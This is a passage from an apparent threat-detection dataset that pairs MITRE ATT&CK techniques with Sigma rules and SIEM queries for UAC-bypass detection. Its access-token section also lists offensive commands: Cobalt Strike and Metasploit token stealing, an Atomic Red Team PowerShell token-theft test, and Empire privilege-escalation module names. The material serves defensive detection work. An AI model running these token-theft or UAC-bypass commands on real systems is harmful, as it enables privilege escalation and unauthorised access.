TargetObject.keyword:HKEY_USERS\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\Classes\\\\\\\\\\\\\\\\exefile\\\\\\\\\\\\\\\\shell\\\\\\\\\\\\\\\\runas\\\\\\\\\\\\\\\\command\\\\\\\\\\\\\\\\isolatedCommand)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'UAC Bypass via sdclt\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:HKEY_USERS\\\\\\\\*\\\\\\\\Classes\\\\\\\\exefile\\\\\\\\shell\\\\\\\\runas\\\\\\\\command\\\\\\\\isolatedCommand)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" TargetObject=\"HKEY_USERS\\\\\\\\*\\\\\\\\Classes\\\\\\\\exefile\\\\\\\\shell\\\\\\\\runas\\\\\\\\command\\\\\\\\isolatedCommand\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject=\"HKEY_USERS\\\\\\\\*\\\\\\\\Classes\\\\\\\\exefile\\\\\\\\shell\\\\\\\\runas\\\\\\\\command\\\\\\\\isolatedCommand\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*HKEY_USERS\\\\\\\\.*\\\\Classes\\\\exefile\\\\shell\\\\runas\\\\command\\\\isolatedCommand))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Empire PowerShell UAC Bypass\nid: 3268b746-88d8-4cd3-bffc-30077d02c787\nstatus: experimental\ndescription: Detects some Empire PowerShell UAC bypass methods\nreferences:\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-FodHelperBypass.ps1#L64\nauthor: Ecco\ndate: 2019/08/30\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update)*'\n            - '* -NoP -NonI -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update);*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1088\n    - car.2019-04-001\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Empire PowerShell UAC Bypass\nid: 3268b746-88d8-4cd3-bffc-30077d02c787\nstatus: experimental\ndescription: Detects some Empire PowerShell UAC bypass methods\nreferences:\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-FodHelperBypass.ps1#L64\nauthor: Ecco\ndate: 2019/08/30\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update)*'\n            - '* -NoP -NonI -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update);*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1088\n    - car.2019-04-001\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ \\\\-NoP\\\\ \\\\-NonI\\\\ \\\\-w\\\\ Hidden\\\\ \\\\-c\\\\ $x\\\\=$\\\\(\\\\(gp\\\\ HKCU\\\\:Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\ Update\\\\).Update\\\\)* OR *\\\\ \\\\-NoP\\\\ \\\\-NonI\\\\ \\\\-c\\\\ $x\\\\=$\\\\(\\\\(gp\\\\ HKCU\\\\:Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\ Update\\\\).Update\\\\);*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Empire-PowerShell-UAC-Bypass <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Empire PowerShell UAC Bypass\",\\n    \"description\": \"Detects some Empire PowerShell UAC bypass methods\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1088\",\\n      \"car.2019-04-001\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-NoP\\\\\\\\ \\\\\\\\-NonI\\\\\\\\ \\\\\\\\-w\\\\\\\\ Hidden\\\\\\\\ \\\\\\\\-c\\\\\\\\ $x\\\\\\\\=$\\\\\\\\(\\\\\\\\(gp\\\\\\\\ HKCU\\\\\\\\:Software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ Update\\\\\\\\).Update\\\\\\\\)* OR *\\\\\\\\ \\\\\\\\-NoP\\\\\\\\ \\\\\\\\-NonI\\\\\\\\ \\\\\\\\-c\\\\\\\\ $x\\\\\\\\=$\\\\\\\\(\\\\\\\\(gp\\\\\\\\ HKCU\\\\\\\\:Software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ Update\\\\\\\\).Update\\\\\\\\);*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-NoP\\\\\\\\ \\\\\\\\-NonI\\\\\\\\ \\\\\\\\-w\\\\\\\\ Hidden\\\\\\\\ \\\\\\\\-c\\\\\\\\ $x\\\\\\\\=$\\\\\\\\(\\\\\\\\(gp\\\\\\\\ HKCU\\\\\\\\:Software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ Update\\\\\\\\).Update\\\\\\\\)* OR *\\\\\\\\ \\\\\\\\-NoP\\\\\\\\ \\\\\\\\-NonI\\\\\\\\ \\\\\\\\-c\\\\\\\\ $x\\\\\\\\=$\\\\\\\\(\\\\\\\\(gp\\\\\\\\ HKCU\\\\\\\\:Software\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ Update\\\\\\\\).Update\\\\\\\\);*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Empire PowerShell UAC Bypass\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(* \\\\-NoP \\\\-NonI \\\\-w Hidden \\\\-c $x=$\\\\(\\\\(gp HKCU\\\\:Software\\\\\\\\Microsoft\\\\\\\\Windows Update\\\\).Update\\\\)* * \\\\-NoP \\\\-NonI \\\\-c $x=$\\\\(\\\\(gp HKCU\\\\:Software\\\\\\\\Microsoft\\\\\\\\Windows Update\\\\).Update\\\\);*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\\\\\\\Microsoft\\\\\\\\Windows Update).Update)*\" OR CommandLine=\"* -NoP -NonI -c $x=$((gp HKCU:Software\\\\\\\\Microsoft\\\\\\\\Windows Update).Update);*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"* -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\\\\\\\Microsoft\\\\\\\\Windows Update).Update)*\", \"* -NoP -NonI -c $x=$((gp HKCU:Software\\\\\\\\Microsoft\\\\\\\\Windows Update).Update);*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* -NoP -NonI -w Hidden -c \\\\$x=\\\\$\\\\(\\\\(gp HKCU:Software\\\\\\\\Microsoft\\\\\\\\Windows Update\\\\)\\\\.Update\\\\).*|.*.* -NoP -NonI -c \\\\$x=\\\\$\\\\(\\\\(gp HKCU:Software\\\\\\\\Microsoft\\\\\\\\Windows Update\\\\)\\\\.Update\\\\);.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Bypass UAC via CMSTP\nid: e66779cc-383e-4224-a3a4-267eeb585c40\ndescription: Detect child processes of automatically elevated instances of Microsoft Connection Manager Profile Installer (cmstp.exe).\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\nmodified: 2019/11/11\ndate: 2019/10/24\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/T1191.md\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1191\n    - attack.t1088\ndetection:\n    selection:\n        Image|endswith: '\\cmstp.exe'\n        CommandLine|contains: \n            - '/s'\n            - '/au'\n    condition: selection\nfalsepositives:\n    - Legitimate use of cmstp.exe utility by legitimate user\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Bypass UAC via CMSTP\nid: e66779cc-383e-4224-a3a4-267eeb585c40\ndescription: Detect child processes of automatically elevated instances of Microsoft Connection Manager Profile Installer (cmstp.exe).\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\nmodified: 2019/11/11\ndate: 2019/10/24\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/T1191.md\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1191\n    - attack.t1088\ndetection:\n    selection:\n        Image|endswith: '\\cmstp.exe'\n        CommandLine|contains: \n            - '/s'\n            - '/au'\n    condition: selection\nfalsepositives:\n    - Legitimate use of cmstp.exe utility by legitimate user\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\cmstp.exe AND CommandLine.keyword:(*\\\\/s* OR *\\\\/au*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Bypass-UAC-via-CMSTP <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Bypass UAC via CMSTP\",\\n    \"description\": \"Detect child processes of automatically elevated instances of Microsoft Connection Manager Profile Installer (cmstp.exe).\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1191\",\\n      \"attack.t1088\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\cmstp.exe AND CommandLine.keyword:(*\\\\\\\\/s* OR *\\\\\\\\/au*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\cmstp.exe AND CommandLine.keyword:(*\\\\\\\\/s* OR *\\\\\\\\/au*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Bypass UAC via CMSTP\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\cmstp.exe AND CommandLine.keyword:(*\\\\/s* *\\\\/au*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\cmstp.exe\" (CommandLine=\"*/s*\" OR CommandLine=\"*/au*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\cmstp.exe\" CommandLine IN [\"*/s*\", \"*/au*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\cmstp\\\\.exe)(?=.*(?:.*.*/s.*|.*.*/au.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Bypass UAC via Fodhelper.exe\nid: 7f741dcf-fc22-4759-87b4-9ae8376676a2\ndescription: Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Tony Lambert), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e491ce22-792f-11e9-8f5c-d46d6d62a49e.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1088/T1088.md\ntags:\n    - attack.privilege_escalation\n    - attack.t1088\ndetection:\n    selection:\n        ParentImage|endswith: '\\fodhelper.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of fodhelper.exe utility by legitimate user\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Bypass UAC via Fodhelper.exe\nid: 7f741dcf-fc22-4759-87b4-9ae8376676a2\ndescription: Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Tony Lambert), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e491ce22-792f-11e9-8f5c-d46d6d62a49e.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1088/T1088.md\ntags:\n    - attack.privilege_escalation\n    - attack.t1088\ndetection:\n    selection:\n        ParentImage|endswith: '\\fodhelper.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of fodhelper.exe utility by legitimate user\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "ParentImage.keyword:*\\\\\\\\fodhelper.exe", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Bypass-UAC-via-Fodhelper.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Bypass UAC via Fodhelper.exe\",\\n    \"description\": \"Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1088\"\\n    ],\\n    \"query\": \"ParentImage.keyword:*\\\\\\\\\\\\\\\\fodhelper.exe\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"ParentImage.keyword:*\\\\\\\\\\\\\\\\fodhelper.exe\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Bypass UAC via Fodhelper.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "ParentImage.keyword:*\\\\\\\\fodhelper.exe", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "ParentImage=\"*\\\\\\\\fodhelper.exe\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\fodhelper.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*\\\\fodhelper\\\\.exe'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Bypass UAC via WSReset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\ndescription: Identifies use of WSReset.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Tony Lambert), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\ntags:\n    - attack.privilege_escalation\n    - attack.t1088\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsreset.exe'\n    filter:\n        Image|endswith: '\\conhost.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Bypass UAC via WSReset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\ndescription: Identifies use of WSReset.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Tony Lambert), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\ntags:\n    - attack.privilege_escalation\n    - attack.t1088\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsreset.exe'\n    filter:\n        Image|endswith: '\\conhost.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\wsreset.exe AND (NOT (Image.keyword:*\\\\\\\\conhost.exe)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Bypass-UAC-via-WSReset.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Bypass UAC via WSReset.exe\",\\n    \"description\": \"Identifies use of WSReset.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1088\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\wsreset.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\conhost.exe)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\wsreset.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\conhost.exe)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Bypass UAC via WSReset.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\wsreset.exe AND (NOT (Image.keyword:*\\\\\\\\conhost.exe)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\wsreset.exe\" NOT (Image=\"*\\\\\\\\conhost.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\wsreset.exe\"  -(Image=\"*\\\\\\\\conhost.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\wsreset\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\conhost\\\\.exe)))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "Credentials:", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "Credentials:", "Built-in Windows Command": "", "Cobalt Strike": "", "Description": "", "Metasploit": ""}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Token Stealing:\nsteal_token pid#", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Token Stealing:\nuse incognito\nlist_tokens -u\nimpersonate_token DOMAIN\\\\User\nor:\nsteal_token {pid}", "name": "Metasploit"}, {"source": "atomics/T1134/T1134.yaml", "command": "#list processes by user,\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nget-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n\n#Steal Token\nSet-Location $PathToAtomicsFolder\n.\\T1134\\src\\T1134.ps1\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/tokens", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/tokens", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/runas", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/runas", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/getsystem", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/getsystem", "name": "Empire Module Command"}], "command_list": ["Token Stealing:\nsteal_token pid#", "Token Stealing:\nuse incognito\nlist_tokens -u\nimpersonate_token DOMAIN\\\\User\nor:\nsteal_token {pid}", "#list processes by user,\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nget-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n\n#Steal Token\nSet-Location $PathToAtomicsFolder\n.\\T1134\\src\\T1134.ps1\n", "powershell/credentials/tokens", "powershell/credentials/tokens", "powershell/management/runas", "powershell/management/runas", "powershell/privesc/getsystem", "powershell/privesc/getsystem"], "technique_id": "T1134", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1134", "Built-in Windows Command": "", "Cobalt Strike": "Token Stealing:\nsteal_token pid#", "Description": "This steals the access token from another process and uses it to gain access to other services or computers. In Cobalt Strike, this token is only used when accessing remote systems, but in Meterpreter, this token is used for everything until it's dropped via rev2self. You need to be in a high integrity process for this to work.", "Metasploit": "Token Stealing:\nuse incognito\nlist_tokens -u\nimpersonate_token DOMAIN\\\\User\nor:\nsteal_token {pid}"}}, {"Atomic Red Team Test - Access Token Manipulation": {"display_name": "Access Token Manipulation", "atomic_tests": [{"description": "Creates a process as another user\nRequires Administrator Privileges To Execute Test\n", "supported_platforms": ["windows"], "name": "Access Token Manipulation", "input_arguments": {"target_user": {"default": "SYSTEM", "type": "String", "description": "Username To Steal Token From"}}, "executor": {"elevation_required": true, "command": "#list processes by user,\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nget-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n\n#Steal Token\nSet-Location $PathToAtomicsFolder\n.\\T1134\\src\\T1134.ps1\n", "name": "powershell"}}], "attack_technique": "T1134"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1134", "Empire Module": "powershell/credentials/tokens", "Technique": "Access Token Manipulation", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/tokens\":  [\"T1134\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1134", "Empire Module": "powershell/management/runas", "Technique": "Access Token Manipulation", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/runas\":  [\"T1134\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1134", "Empire Module": "powershell/privesc/getsystem", "Technique": "Access Token Manipulation", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/getsystem\":  [\"T1134\"],"}}], "queries": [{"query": "action: global\ntitle: Meterpreter or Cobalt Strike getsystem service installation\nid: 843544a7-56e0-4dcc-a44f-5cc266dd97d6\ndescription: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/26\nmodified: 2019/11/11\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n    - 